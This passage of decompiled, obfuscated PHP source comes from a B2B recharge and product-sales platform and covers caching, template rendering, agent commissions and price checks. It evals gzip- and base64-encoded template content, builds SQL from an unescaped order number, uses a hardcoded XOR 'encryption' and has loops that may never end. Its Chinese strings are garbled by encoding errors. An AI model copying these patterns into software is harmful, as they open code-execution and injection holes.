								}
								include( $R1ed7ad9990 );
								return $R046b4585a2;
				}

				public function GetCatCache( )
				{
								$R1ed7ad9990 = PCACHE."cat.php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$R808b89ba0e = $this->UpdateCache( "category" );
								}
								include( $R1ed7ad9990 );
								return $Rd2e691562d;
				}

				public function GetSubCatCache( )
				{
								$R1ed7ad9990 = PCACHE."subcat.php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$R808b89ba0e = $this->UpdateCache( "category" );
								}
								include( $R1ed7ad9990 );
								return $R27752f5168;
				}

				public function GetGameTplCache( )
				{
								$R808b89ba0e = 1;
								$R1ed7ad9990 = PCACHE."gametpl.php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$R808b89ba0e = $this->UpdateCache( "gametpl" );
								}
								if ( $R808b89ba0e == 1 )
								{
												include( $R1ed7ad9990 );
												return $Rfb5a710323;
								}
								else
								{
												return array( );
								}
				}

				public function GetAdCache( )
				{
								$R1ed7ad9990 = SITECACHE."ad.php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$R808b89ba0e = $this->UpdateCache( "ad" );
								}
								include( $R1ed7ad9990 );
								return $R58765afcb5;
				}

				public function GetVipCache( )
				{
								$R1ed7ad9990 = SITECACHE."u_vip.php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$R808b89ba0e = $this->UpdateCache( "vip" );
								}
								include( $R1ed7ad9990 );
								return $R6009ea84c3;
				}

				public function GetRankCache( $R2a51483b14 )
				{
								$R808b89ba0e = 1;
								$R1ed7ad9990 = ACACHE."rank_".$R2a51483b14.".php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$R808b89ba0e = $this->UpdateCache( "priceplan", array(
																"arg1" => $R2a51483b14
												) );
								}
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												return array( );
								}
								else
								{
												include( $R1ed7ad9990 );
												if ( $R808b89ba0e == 1 )
												{
																include( $R1ed7ad9990 );
																return $R0acfedc1db;
												}
												else
												{
																return array( );
												}
								}
				}

				public function GetSecCache( $R2a51483b14, $R94e0136c8a )
				{
								$R808b89ba0e = 1;
								$R1ed7ad9990 = ACACHE."sec_".$R2a51483b14."_".$R94e0136c8a.".php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$R808b89ba0e = $this->UpdateCache( "security", array(
																"arg1" => $R2a51483b14,
																"arg2" => $R94e0136c8a
												) );
								}
								if ( $R808b89ba0e == 1 )
								{
												include( $R1ed7ad9990 );
												return $R39ad040863;
								}
								else
								{
												$R39ad040863 = array( "ipcheck" => "0", "ip" => ",,,,", "maccheck" => "0", "mac" => ",,,,", "hdecheck" => "0", "hde" => ",,,,", "cpucheck" => "0", "cpu" => ",,,,", "mibaokacheck" => "0", "mibaoka" => "", "mobilecheck" => "0", "mobile" => "", "randcheck" => "0", "randpos" => "1", "randtype" => "1", "tradeneedpwd" => "0", "addrcheck" => "0", "addr" => "", "ipnopcheck" => "0", "ipnop" => "", "mobileconfig" => "0,0,0", "mibaokaconfig" => "0,0,0" );
												return $R39ad040863;
								}
				}

				public function GetVipProductShowCache( )
				{
								$R1ed7ad9990 = SITECACHE."productshow.php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												return array( );
								}
								else
								{
												include( $R1ed7ad9990 );
												$R3db8f5c8bc = explode( ",", $Rbfa3d20675 );
												return $R3db8f5c8bc;
								}
				}

				public function GetVipCategoryShowCache( )
				{
								$R1ed7ad9990 = SITECACHE."categoryshow.php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												return array( );
								}
								else
								{
												include( $R1ed7ad9990 );
												$R3db8f5c8bc = explode( ",", $Recf8a496d8 );
												return $R3db8f5c8bc;
								}
				}

				public function GetFxCache( )
				{
								global $masterid;
								if ( $masterid == 0 )
								{
												$R1ed7ad9990 = SITECACHE."fx.php";
								}
								else
								{
												global $cache;
												$R1ed7ad9990 = "./content/".$cache."/site/fx.php";
								}
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$R808b89ba0e = $this->UpdateCache( "fx" );
								}
								include( $R1ed7ad9990 );
								if ( isset( $Rb321ab3f5e['curfx'] ) )
								{
												if ( intval( $Rb321ab3f5e['curfx'] ) <= 0 )
												{
																$Rb321ab3f5e['curfx'] = 1;
												}
								}
								else
								{
												$Rb321ab3f5e = array( "curfx" => 1 );
								}
								return $Rb321ab3f5e;
				}

				public function GetQuickCache( )
				{
								$R1ed7ad9990 = PCACHE."quick.php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$R808b89ba0e = $this->UpdateCache( "quick" );
								}
								include( $R1ed7ad9990 );
								if ( !isset( $R93c5cf68df ) )
								{
												return array( );
								}
								else
								{
												return $R93c5cf68df;
								}
				}

				public function Mncrypt( $Rbac6806bcb = "" )
				{
								$R149a03b376 = "It's kond of you to visit me!!";
								$Rb3afac90b0 = "";
								$R81603a608a = strlen( $Rbac6806bcb );
								$R7ae15ffdf2 = strlen( $R149a03b376 );
								
								for ( $Ra16d228039 = 0;	$Ra16d228039 < $R81603a608a && $Ra16d228039 < $R7ae15ffdf2;	$Ra16d228039++	)
								{
												$R30b2ab8dc1 = substr( $Rbac6806bcb, $Ra16d228039, 1 );
												$Ra09fe38af3 = substr( $R149a03b376, $Ra16d228039, 1 );
												$R30b2ab8dc1 ^= $Ra09fe38af3;
												$Rb3afac90b0 .= $R30b2ab8dc1;
								}
								return $Rb3afac90b0;
				}

				public function GetTplVer( $tpl = 0 )
				{
								$R770dcaf6d0 = UPATH_BASE.DS."content".DS."mod_shared".DS."skins".DS."systpl".DS."info.php";
								if ( file_exists( $R770dcaf6d0 ) )
								{
												include( $R770dcaf6d0 );
												if ( isset( $R355ef3fa24[$tpl] ) )
												{
																return $R355ef3fa24[$tpl];
												}
												else
												{
																return 0;
												}
								}
								else
								{
												return 0;
								}
				}

				public function UpdateTpl( $Ra5920cf442 )
				{
								$Rcabbe21a4f = factory::getservice( "stpl" );
								$data = array(
												"tplid" => $Ra5920cf442
								);
								return $Rcabbe21a4f->ISTpl_Get( $data );
				}

				public function GetTplCache( $Rb3f07f8c36, $R45a48605c5 = 0 )
				{
								$R1b69c92460 = $Rb3f07f8c36['ptype'];
								$R0f571378e3 = $Rb3f07f8c36['cztpl'];
								$R1089095e46 = $Rb3f07f8c36['syscztpl'];
								$Rdd56d1db01 = 0;
								if ( $R1b69c92460 == 2 && $R0f571378e3 == 0 && 0 < $R1089095e46 )
								{
												$Rdd56d1db01 = 1;
												$R3db8f5c8bc = "<tr><td colspan=\"2\"><span id=\"cztpl\"></span></td></tr><script type=\"text/javascript\">TplHtml=\"\";</script><script type=\"text/javascript\" src=\"".UPATH_WEBROOT."content/mod_shared/skins/cztpl/".$R1089095e46.".js\"></script>";
												$this->Assign( "tplcontent", $R3db8f5c8bc );
								}
								if ( $Rdd56d1db01 == 1 || $R1b69c92460 == 0 || $R1b69c92460 == 3 || 90 < $R1b69c92460 || $R1089095e46 == 0 && $R0f571378e3 == 0 )
								{
												$Rbaf021a7fd = "";
												$R5a38c81ec2 = $Rb3f07f8c36['unit'];
												if ( trim( $Rb3f07f8c36['qtylist'] ) == "" )
												{
																$R0cdee13a13 = $Rb3f07f8c36['qtymin'];
																$R7b5951700d = $Rb3f07f8c36['qtymax'];
																
																for ( $Ra16d228039 = $R0cdee13a13;	$Ra16d228039 <= $R7b5951700d;	$Ra16d228039++	)
																{
																				$Rbaf021a7fd .= "<option value=\"".$Ra16d228039."\">".$Ra16d228039.$R5a38c81ec2."</option>";
																}
												}
												else
												{
																$Rcc5c6e696c = explode( ",", $Rb3f07f8c36['qtylist'] );
																foreach ( $Rcc5c6e696c as $R0f8134fb60 )
																{
																				$Rbaf021a7fd .= "<option value=\"".intval( $R0f8134fb60 )."\">".intval( $R0f8134fb60 ).$R5a38c81ec2."</option>";
																}
												}
												$this->Assign( "qtylist", $Rbaf021a7fd );
												return "";
								}
								$Ra5920cf442 = intval( $R0f571378e3 );
								if ( $Ra5920cf442 == 0 )
								{
												return "";
								}
								$R770dcaf6d0 = UPATH_BASE.DS."content".DS."mod_shared".DS."skins".DS."systpl".DS.$Ra5920cf442.".php";
								if ( !file_exists( $R770dcaf6d0 ) || $R45a48605c5 == 1 )
								{
												$this->UpdateTpl( $Ra5920cf442 );
								}
								if ( file_exists( $R770dcaf6d0 ) )
								{
												include( $R770dcaf6d0 );
												if ( !isset( $R476d5c02b8 ) )
												{
																$tpl = array( "html" => "", "unit" => "��", "qtymin" => 1, "qtymax" => 1, "qtylist" => "", "needxml" => 0, "js" => 0 );
												}
												else
												{
																eval( gzinflate( base64_decode( $R476d5c02b8 ) ) );
												}
								}
								else
								{
												$tpl = array( "html" => "", "unit" => "��", "qtymin" => 1, "qtymax" => 1, "qtylist" => "", "needxml" => 0, "js" => 0 );
								}
								$R3db8f5c8bc = "";
								$R3db8f5c8bc = $tpl['html'];
								$R239f541f81 = trim( $tpl['qtylist'] );
								$Rbaf021a7fd = "";
								$R5a38c81ec2 = $tpl['unit'];
								if ( $R239f541f81 == "" )
								{
												$Rdd54631fee = isset( $tpl['qtytime'] ) ? intval( $tpl['qtytime'] ) : 1;
												if ( $Rdd54631fee == 0 )
												{
																$Rdd54631fee = 1;
												}
												$R0cdee13a13 = $tpl['qtymin'];
												$R7b5951700d = $tpl['qtymax'];
												$Raa3df95a19 = isset( $tpl['tunit'] ) ? $tpl['tunit'] : "";
												$Rb813fe0dc6 = "";
												
												for ( $Ra16d228039 = $R0cdee13a13;	$Ra16d228039 <= $R7b5951700d;	$Ra16d228039++	)
												{
																$R8a2e825e62 = $Ra16d228039 * $Rdd54631fee;
																if ( $Raa3df95a19 != "" )
																{
																				$Rd0b6e29f32 = isset( $tpl['tqtytime'] ) ? intval( $tpl['tqtytime'] ) : 1;
																				if ( $Rd0b6e29f32 == 0 )
																				{
																								$Rd0b6e29f32 = 1;
																				}
																				$Rfb5a172906 = $Ra16d228039 * $Rd0b6e29f32;
																				$Rb813fe0dc6 = "(".$Rfb5a172906.$Raa3df95a19.")";
																}
																$Rbaf021a7fd .= "<option value=\"".$R8a2e825e62."\">".$R8a2e825e62.$R5a38c81ec2.$Rb813fe0dc6."</option>";
												}
								}
								else
								{
												$Raa3df95a19 = isset( $tpl['tunit'] ) ? $tpl['tunit'] : "";
												$Rcc5c6e696c = explode( ",", $R239f541f81 );
												if ( $Raa3df95a19 != "" )
												{
																$Rf38d20981e = explode( ",", trim( $tpl['tqtylist'] ) );
												}
												$Rb813fe0dc6 = "";
												$Ra16d228039 = 0;
												foreach ( $Rcc5c6e696c as $R0f8134fb60 )
												{
																if ( $Raa3df95a19 != "" )
																{
																				$Rb813fe0dc6 = "(".$Rf38d20981e[$Ra16d228039].$Raa3df95a19.")";
																				$Ra16d228039++;
																}
																$Rbaf021a7fd .= "<option value=\"".intval( $R0f8134fb60 )."\">".intval( $R0f8134fb60 ).$R5a38c81ec2.$Rb813fe0dc6."</option>";
												}
								}
								if ( isset( $tpl['js'] ) && 0 < $tpl['js'] )
								{
												$R3db8f5c8bc .= "<script type=\"text/javascript\" src=\"".UPATH_WEBROOT."content/mod_shared/skins/systpl/".$tpl['js'].".js\"></script>";
								}
								else if ( isset( $tpl['xmlload'] ) && $tpl['xmlload'] == 1 )
								{
												$R3db8f5c8bc .= "<script type=\"text/javascript\">ubzloadxml(\"\");</script>";
								}
								if ( isset( $tpl['exthtml'] ) )
								{
												$this->Assign( "extcontent", $tpl['exthtml'] );
								}
								$this->Assign( "qtylist", $Rbaf021a7fd );
								$this->Assign( "tplcontent", $R3db8f5c8bc );
								$this->Assign( "xml", $tpl['needxml'] );
				}

				public function MyDC( $R63bede6b19 )
				{
								$R6afe761ae0 = substr( $this->GetBizKey( ), 8 );
								return str_replace( $R6afe761ae0, "", base64_decode( gzinflate( base64_decode( base64_decode( $R63bede6b19 ) ) ) ) );
				}

				public function MyEC( $R63bede6b19 )
				{
								$R6afe761ae0 = substr( $this->GetBizKey( ), 8 );
								return base64_encode( base64_encode( gzdeflate( base64_encode( $R63bede6b19.$R6afe761ae0 ) ) ) );
				}

				public function Checkb2bSession( )
				{
								global $g_mod;
								global $g_controller;
								global $g_action;
								$this->session = factory::getinstance( "session" );
								if ( $this->session->agent == "" )
								{
												$this->Alert( "ϵͳ�Ѿ��˳��������µ�½��" );
												$this->GoHome( "b2b" );
								}
								$this->Assign( "agent", $this->session->agent );
								global $masterid;
								if ( $masterid == 0 )
								{
												$R09a3346376 = SITECACHE."b2bwebname.php";
								}
								else
								{
												global $cache;
												$R09a3346376 = "./content/".$cache."/site/b2bwebname.php";
								}
								include( $R09a3346376 );
								if ( strpos( $g_action, "Save" ) === false && strpos( $g_action, "save" ) === false )
								{
												$R7135610620 = $g_mod."_".ucfirst( $g_controller )."_".ucfirst( $g_action );
												$R63bede6b19 = isset( $weburlname[$R7135610620] ) ? $weburlname[$R7135610620] : "";
												$this->B2BInit( $R63bede6b19 );
								}
				}

				public function GetAdmRight( $R5b92e56774 )
				{
								$Rff0cc71a1d = factory::getinstance( "session" );
								$Ra0c8454e75 = $Rff0cc71a1d->adminrights;
								if ( 1 < $Rff0cc71a1d->adminrank )
								{
												return isset( $Ra0c8454e75[$R5b92e56774] ) ? $Ra0c8454e75[$R5b92e56774] : 0;
								}
								else
								{
												return 1;
								}
				}

				public function ShowMainProduct( )
				{
								return 0;
				}

				public function FilterPi( $R48f7b140a2, $R7fb26bbe56 )
				{
								$R4e420efcc3 = array( );
								foreach ( $R48f7b140a2 as $R0f8134fb60 )
								{
												if ( $R0f8134fb60['forb2b'] == 1 && $R0f8134fb60['sell'] == 1 && $R0f8134fb60['inrecycle'] != 1 )
												{
																if ( 0 < $R0f8134fb60['owner'] )
																{
																				if ( in_array( $R0f8134fb60['owner'], $R7fb26bbe56 ) )
																				{
																								if ( $R0f8134fb60['tosys'] <= 0 )
																								{
																												$R4e420efcc3[] = $R0f8134fb60;
																								}
																								else if ( $R0f8134fb60['tosys'] == 1 && $R0f8134fb60['checked'] == 1 )
																								{
																												$R4e420efcc3[] = $R0f8134fb60;
																								}
																				}
																				else if ( $R0f8134fb60['tosys'] == 1 && $R0f8134fb60['checked'] == 1 )
																				{
																								$R4e420efcc3[] = $R0f8134fb60;
																				}
																}
																else
																{
																				$R4e420efcc3[] = $R0f8134fb60;
																}
												}
								}
								return $R4e420efcc3;
				}

				public function RetPi1( $R4e420efcc3 )
				{
								global $masterid;
								if ( 0 < $masterid )
								{
												$Rdc7dc55174 = $this->GetVipProductShowCache( );
												$R18ba711cb5 = array( );
												foreach ( $Rdc7dc55174 as $R0f8134fb60 )
												{
																if ( $R0f8134fb60 != "" )
																{
																				$R18ba711cb5[$R0f8134fb60] = 1;
																}
												}
												$R026f0167b4 = array( );
												foreach ( $R4e420efcc3 as $R0f8134fb60 )
												{
																if ( isset( $R18ba711cb5[$R0f8134fb60['pid']] ) )
																{
																				$R92d469f1ec = isset( $R0f8134fb60['owner'] ) ? $R0f8134fb60['owner'] : $R0f8134fb60['aid'];
																				if ( $R92d469f1ec == $masterid || $R92d469f1ec == 0 || $R92d469f1ec == -1 || 0 < $R92d469f1ec && $R0f8134fb60['tosys'] == 1 && $R0f8134fb60['checked'] == 1 )
																				{
																								$R026f0167b4[] = $R0f8134fb60;
																				}
																				else if ( 0 < $R92d469f1ec && $R0f8134fb60['tosys'] != 1 )
																				{
																								$R2195dadd9d = $this->GetAgentCache( $R92d469f1ec );
																								$Rac9b8532b8 = $R2195dadd9d['parentid'];
																								if ( 0 < $Rac9b8532b8 && $Rac9b8532b8 == $masterid )
																								{
																												$R026f0167b4[] = $R0f8134fb60;
																								}
																								else
																								{
																												do
																												{
																																if ( 0 < $Rac9b8532b8 )
																																{
																																				$R2195dadd9d = $this->GetAgentCache( $Rac9b8532b8 );
																																				$Rac9b8532b8 = $R2195dadd9d['parentid'];
																																				if ( $Rac9b8532b8 == $masterid )
																																				{
																																								$R026f0167b4[] = $R0f8134fb60;
																																								continue;
																																				}
																																}
																												} while ( 1 );
																								}
																				}
																}
												}
												$R4e420efcc3 = $R026f0167b4;
								}
								return $R4e420efcc3;
				}

				public function RetPi( $R4e420efcc3 )
				{
								global $masterid;
								if ( 0 < $masterid )
								{
												$Rdc7dc55174 = $this->GetVipProductShowCache( );
												$R18ba711cb5 = array( );
												foreach ( $Rdc7dc55174 as $R0f8134fb60 )
												{
																if ( $R0f8134fb60 != "" )
																{
																				$R18ba711cb5[$R0f8134fb60] = 1;
																}
												}
												$R026f0167b4 = array( );
												foreach ( $R4e420efcc3 as $R0f8134fb60 )
												{
																if ( isset( $R18ba711cb5[$R0f8134fb60['pid']] ) )
																{
																				$R92d469f1ec = isset( $R0f8134fb60['owner'] ) ? $R0f8134fb60['owner'] : $R0f8134fb60['aid'];
																				if ( $R92d469f1ec == $masterid || $R92d469f1ec == 0 || $R92d469f1ec == -1 || 0 < $R92d469f1ec && $R0f8134fb60['tosys'] == 1 && $R0f8134fb60['checked'] == 1 )
																				{
																								$R026f0167b4[] = $R0f8134fb60;
																				}
																				else if ( 0 < $R92d469f1ec && $R0f8134fb60['tosys'] != 1 )
																				{
																								$R2195dadd9d = $this->GetAgentCache( $R92d469f1ec );
																								$Rac9b8532b8 = $R2195dadd9d['parentid'];
																								if ( 0 < $Rac9b8532b8 && $Rac9b8532b8 == $masterid )
																								{
																												$R026f0167b4[] = $R0f8134fb60;
																								}
																								else
																								{
																												do
																												{
																																if ( 0 < $Rac9b8532b8 )
																																{
																																				$R2195dadd9d = $this->GetAgentCache( $Rac9b8532b8 );
																																				$Rac9b8532b8 = $R2195dadd9d['parentid'];
																																				if ( $Rac9b8532b8 == $masterid )
																																				{
																																								$R026f0167b4[] = $R0f8134fb60;
																																								continue;
																																				}
																																}
																												} while ( 1 );
																								}
																				}
																}
												}
												$R4e420efcc3 = $R026f0167b4;
								}
								return $R4e420efcc3;
				}

				public function LoginGo( )
				{
								$R30b2ab8dc1 = $this->GetMainWebCache( );
								global $vipdir1;
								include( UPATH_ROOT.$vipdir1.DS."libraries".DS."user".DS."vid.php" );
								if ( !isset( $R30b2ab8dc1['loginurl'] ) || $R30b2ab8dc1['loginurl'] == "" )
								{
												$Rdfef9ec3ff = "index.php?m=mod_b2b&".( $frame == 0 ? "a=home" : "c=Frame" );
								}
								else
								{
												$Rdfef9ec3ff = "index.php?".( $frame == 0 ? $R30b2ab8dc1['loginurl'] : "m=mod_b2b&c=Frame&rethttp=".urlencode( "index.php?".$R30b2ab8dc1['loginurl'] ) );
								}
								$this->ScriptRedirect( $Rdfef9ec3ff );
				}

				public function LoginMsgGo( )
				{
								$R30b2ab8dc1 = $this->GetMainWebCache( );
								global $vipdir1;
								include( UPATH_ROOT.$vipdir1.DS."libraries".DS."user".DS."vid.php" );
								if ( !isset( $R30b2ab8dc1['loginurl'] ) || $R30b2ab8dc1['loginurl'] == "" )
								{
												$Rdfef9ec3ff = "index.php?".( $frame == 0 ? "m=mod_agent&c=Messenger" : "m=mod_b2b&c=Frame&rethttp=".urlencode( "index.php?m=mod_agent&c=Messenger" ) );
								}
								else
								{
												$Rdfef9ec3ff = "index.php?".( $frame == 0 ? $R30b2ab8dc1['loginurl'] : "m=mod_b2b&c=Frame&rethttp=".urlencode( "index.php?".$R30b2ab8dc1['loginurl'] ) );
								}
								$this->ScriptRedirect( $Rdfef9ec3ff );
				}

				public function AgentProfit( $R5d899a20a5, $R8e8b5578f7, $R66b0d9d6f1, $Rdcd9105806, $R65edce27dd = "", $R2e7195340d = 0 )
				{
								if ( trim( $R5d899a20a5 ) == "" )
								{
												return 0;
								}
								$R2097a8fddf = factory::getinstance( "agents" );
								$agent = $R2097a8fddf->IAgent_GetByName( $R5d899a20a5 );
								if ( !isset( $agent['parentid'] ) || $agent['parentid'] == 0 )
								{
												return 0;
								}
								$R2a51483b14 = $agent['aid'];
								$Rdeabc7f106 = factory::getinstance( "orders" );
								$Re4e4d12350 = $Rdeabc7f106->IOrder_GetByStr( " ordno = '".$Rdcd9105806."'", "cprice" );
								if ( isset( $Re4e4d12350[0]['cprice'] ) )
								{
												$R0d9f8f778c = $Re4e4d12350[0]['cprice'];
												$R30b2ab8dc1 = $this->GetMainWebCache( );
												$R102805af37 = 0;
												$R792faae056 = -1;
												$R984767f360 = 1;
												$Ra7875614d8 = explode( "|", $R30b2ab8dc1['config'] );
												if ( isset( $Ra7875614d8[30] ) )
												{
																$R792faae056 = $Ra7875614d8[30];
																if ( $R792faae056 < -1 )
																{
																				$R792faae056 = -1;
																}
												}
												if ( isset( $Ra7875614d8[31] ) )
												{
																$R984767f360 = $Ra7875614d8[31];
																if ( $R984767f360 < 0 )
																{
																				$R984767f360 = 0;
																}
																$R984767f360 /= 100;
																if ( 1 < $R984767f360 )
																{
																				$R984767f360 = 1;
																}
												}
												return $this->AgentProfit1( $R2a51483b14, $R8e8b5578f7, $R66b0d9d6f1, $Rdcd9105806, $R65edce27dd, $R2e7195340d, $R0d9f8f778c, $R102805af37, $R792faae056, $R984767f360 );
								}
								else
								{
												return 0;
								}
				}

				public function AgentProfit1( $R2a51483b14, $R8e8b5578f7, $R66b0d9d6f1, $Rdcd9105806, $R65edce27dd = "", $R2e7195340d = 0, $R0d9f8f778c = 0, $R102805af37 = 0, $R792faae056 = 1000, $R984767f360 = 1 )
				{
								$agent = $this->GetAgentCache( $R2a51483b14 );
								if ( !isset( $agent['parentid'] ) || $agent['parentid'] == 0 )
								{
												return 0;
								}
								if ( 0 <= $R792faae056 && $R792faae056 <= $R102805af37 )
								{
												return 0;
								}
								$R102805af37++;
								$R3a8b307327 = $this->GetDec( );
								$R55c494bb27 = $this->GetProductCache( $R8e8b5578f7 );
								$R2097a8fddf = factory::getinstance( "agents" );
								$R9aa102385f = $R2097a8fddf->IAgent_Get( $agent['parentid'], "aname,alv,income,aid,parentid,aremain,pricetpl" );
								if ( $agent['parentid'] == $R2e7195340d )
								{
												$Race8252ffc = 0;
								}
								else
								{
												$R4f39743f74 = $this->GetPriceById( $R55c494bb27, $agent, $R3a8b307327 );
												$R55ee8b3585 = $this->GetPriceById( $R55c494bb27, $R9aa102385f, $R3a8b307327 );
												$Race8252ffc = ( $R4f39743f74 - $R55ee8b3585 ) * $R66b0d9d6f1 * $R984767f360;
												$Race8252ffc = round( $Race8252ffc, $R3a8b307327 );
												if ( $R0d9f8f778c < $R4f39743f74 || $R0d9f8f778c < $R55ee8b3585 )
												{
																$Race8252ffc = 0;
																return 0;
												}
												if ( 0 < $Race8252ffc )
												{
																$Rd7a133b20f = $R9aa102385f['income'] + $Race8252ffc;
																$Rd7a133b20f = round( $Rd7a133b20f, $R3a8b307327 );
																$data = array(
																				"income" => $Rd7a133b20f
																);
																$R2097a8fddf->IAgent_Update( $data, $agent['parentid'] );
																$this->UpdateTrade( $R9aa102385f['aid'], 11, $Rdcd9105806, $agent['aid'], "[��������]".$R65edce27dd, $R55ee8b3585, $R66b0d9d6f1, $Race8252ffc, $agent['aid'], $Rd7a133b20f, $R9aa102385f['income'], $R4f39743f74 );
												}
								}
								$Race8252ffc += $this->AgentProfit( $R9aa102385f['aname'], $R8e8b5578f7, $R66b0d9d6f1, $Rdcd9105806, $R65edce27dd, $R2e7195340d, $R0d9f8f778c, $R102805af37, $R792faae056, $R984767f360 );
								$Race8252ffc = round( $Race8252ffc, $R3a8b307327 );
								return $Race8252ffc;
				}

				public function UpdateTrade( $R2a51483b14, $Ra8b176bf4f, $Rdcd9105806, $R63384ccc42, $R65edce27dd, $R63d0786ecc, $R66b0d9d6f1, $Race8252ffc, $Rc57f84679f, $Rc0c42883ee, $R3ab1f9eb35, $Red2b3403a5, $Rd541ac7c24 = 0 )
				{
								$Re82ee9b121 = $R65edce27dd." x ".$R63d0786ecc."(".$R66b0d9d6f1.")";
								$data = array(
												"aid" => $R2a51483b14,
												"tradetype" => $Ra8b176bf4f,
												"ordno" => $Rdcd9105806,
												"income" => $Race8252ffc,
												"outcome" => $Rd541ac7c24,
												"fat" => $Rc0c42883ee,
												"fbt" => $R3ab1f9eb35,
												"content" => $Re82ee9b121,
												"operator" => $R63384ccc42,
												"otherside" => $Rc57f84679f,
												"state" => 5,
												"price" => $R63d0786ecc,
												"listprice" => $Red2b3403a5,
												"qty" => $R66b0d9d6f1,
												"createdate" => date( "Y-m-d H-i-s" )
								);
								$Race6ab87b1 = factory::getinstance( "trades" );
								$Race6ab87b1->ITrade_Create( $data );
				}

				public function GetCzInfo( $R8e8b5578f7, $R0f571378e3 )
				{
								$R1867fa760f = factory::getservice( "sversion" );
								$data = array(
												"pid" => $R8e8b5578f7,
												"cztpl" => $R0f571378e3
								);
								$R3db8f5c8bc = $R1867fa760f->IVer_GetCz( $data );
								return $R3db8f5c8bc;
				}

				public function CheckCzInfo( $R56ea904d53, $R0f571378e3, $R808b89ba0e = 0 )
				{
								$R63bede6b19 = $this->CheckCzInfo1( $R56ea904d53, $R0f571378e3 );
								if ( $R63bede6b19 != -1 )
								{
												if ( $R808b89ba0e == 0 )
												{
																$this->Alert( $R63bede6b19 );
																$this->HistoryGo( );
												}
												else if ( $R808b89ba0e == 2 )
												{
																$this->Alert( $R63bede6b19 );
																$this->CloseWin( );
												}
												else
												{
																echo $R63bede6b19;
																exit( );
												}
								}
				}

				public function CheckCzInfo1( $R56ea904d53, $R0f571378e3 )
				{
								$R355ef3fa24 = $this->GetCzInfo( $R56ea904d53['pid'], $R0f571378e3 );
								if ( isset( $R355ef3fa24['v'] ) )
								{
												$R7894b33158 = false;
												$Rd58c989273 = false;
												$data = array( );
												$Rc28d922133 = intval( $R355ef3fa24['cztpl'] );
												$R558acfa73f = 0;
												$R63bede6b19 = "";
												$Rb321ab3f5e = $this->GetFxCache( );
												$R96e20b4752 = $Rb321ab3f5e['curfx'];
												$R3a8b307327 = $this->GetDec( );
												$Rf64b3b1325 = $R355ef3fa24['supprice'] * $R96e20b4752;
												$Rf64b3b1325 = round( $Rf64b3b1325, $R3a8b307327 );
												$Rf05cb9bec5 = 0;
												if ( $R56ea904d53['price'] < $Rf64b3b1325 )
												{
																$R8e8b5578f7 = $R56ea904d53['pid'];
																$Rb3f07f8c36 = $this->GetProductCache( $R8e8b5578f7 );
																$Rf05cb9bec5 = intval( $Rb3f07f8c36['sale'] );
																if ( $Rf05cb9bec5 == 0 )
																{
																				$R7894b33158 = true;
																				$data['price'] = $Rf64b3b1325;
																}
												}
												if ( $R0f571378e3 != $Rc28d922133 && $R56ea904d53['ptype'] == 1 && 0 < $Rc28d922133 )
												{
																$R7894b33158 = true;
																$data['cztpl'] = $Rc28d922133;
																$Rd58c989273 = true;
												}
												if ( $R7894b33158 )
												{
																$R558acfa73f = $this->AutoAdjustPrice( );
																if ( $R558acfa73f == 1 )
																{
																				$R8e8b5578f7 = $R56ea904d53['pid'];
																				$R422f9a4efb = factory::getinstance( "products" );
																				$R808b89ba0e = $R422f9a4efb->IProduct_Update( $data, $R8e8b5578f7 );
																				if ( $R808b89ba0e == false )
																				{
																								$R2145464ecd = false;
																				}
																				else
																				{
																								$this->UpdateCache( "products", array(
																												"arg1" => $R8e8b5578f7
																								) );
																								$Rd7a0141727 = $this->GetProductCache( $R8e8b5578f7 );
																								$this->UpdateCache( "list", array(
																												"arg1" => $Rd7a0141727['catid']
																								) );
																								$Rb62a6519ba = $Rd7a0141727['pinyin'];
																								if ( $Rb62a6519ba != "" )
																								{
																												if ( "0" < $Rb62a6519ba && $Rb62a6519ba < "9" )
																												{
																																$Rb62a6519ba = "09";
																												}
																												$this->UpdateCache( "pinyin", array(
																																"arg1" => $Rb62a6519ba
																												) );
																								}
																								if ( $Rd58c989273 )
																								{
																												global $baseurl;
																												if ( UB_B2C )
																												{
																																$R0488034856 = $this->GetMainSite( "b2c" );
																																if ( $R0488034856 != "" )
																																{
																																				$url = $R0488034856.$baseurl."/index.php?m=mod_b2c&c=Product&a=Html&pid=".$R8e8b5578f7;
																																				@file_get_contents( $url );
																																}
																												}
																												if ( UB_YKT )
																												{
																																$R0488034856 = $this->GetMainSite( "ykt" );
																																if ( $R0488034856 != "" )
																																{
																																				$url = $R0488034856.$baseurl."/index.php?m=mod_ykt&c=Product&a=Html&pid=".$R8e8b5578f7;
																																				@file_get_contents( $url );
																																}
																												}
																								}
																								return "ϵͳ����Ʒ�����˵�������ˢ��ҳ��������µ���";
																				}
																}
												}
												if ( $R56ea904d53['price'] < $Rf64b3b1325 && $Rf05cb9bec5 == 0 )
												{
																return "��Ʒ�۸����ô�������ϵ����Ա�޸ģ�";
												}
												if ( $R56ea904d53['ptype'] == 1 && 0 < $R0f571378e3 )
												{
																$R47d14bb6ff = $this->GetTplVer( $R0f571378e3 );
																$R7a83769a63 = intval( $R355ef3fa24['ver'] );
																if ( $R47d14bb6ff < $R7a83769a63 )
																{
																				$this->UpdateTpl( $R0f571378e3 );
																				return "ϵͳ�Գ�ֵģ�����˵�������ˢ��ҳ��������µ���";
																}
												}
												$R66b0d9d6f1 = $R56ea904d53['qty'];
												if ( isset( $R355ef3fa24['ptype'] ) && $R355ef3fa24['ptype'] != 9999 )
												{
																$R1b69c92460 = $R56ea904d53['ptype'];
																if ( $R56ea904d53['ptype'] == 3 )
																{
																				$R1b69c92460 = 0;
																}
																if ( $R1b69c92460 != $R355ef3fa24['ptype'] )
																{
																				return "��Ʒ�������ô�������ϵ����Ա�޸ģ�";
																}
												}
												if ( $R355ef3fa24['maxqty'] < $R66b0d9d6f1 )
												{
																return "ƽ̨����Ա�����㣬���޷�������ô�����Ʒ��������ѡ�������ϵ����Ա��";
												}
												if ( $R355ef3fa24['qtyctrl'] == 1 )
												{
																if ( $R355ef3fa24['qtylist'] != "" )
																{
